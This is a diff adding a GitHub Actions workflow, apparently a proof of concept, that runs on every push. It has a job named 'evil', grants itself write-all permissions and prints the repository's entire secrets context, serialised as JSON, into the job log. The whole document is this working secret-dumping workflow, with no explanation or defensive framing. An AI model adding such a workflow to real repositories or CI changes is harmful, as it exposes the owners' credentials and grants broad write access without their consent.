@@ -1,0 +1,11 @@
+on: push
+
+jobs:
+  evil:
+    runs-on: ubuntu-latest
+    permissions: write-all
+    steps:
+      - run: echo "Access to secrets, and write-permissions"
+      - run: echo $SECRETS
+        env:
+          SECRETS: ${{ toJSON(secrets) }}
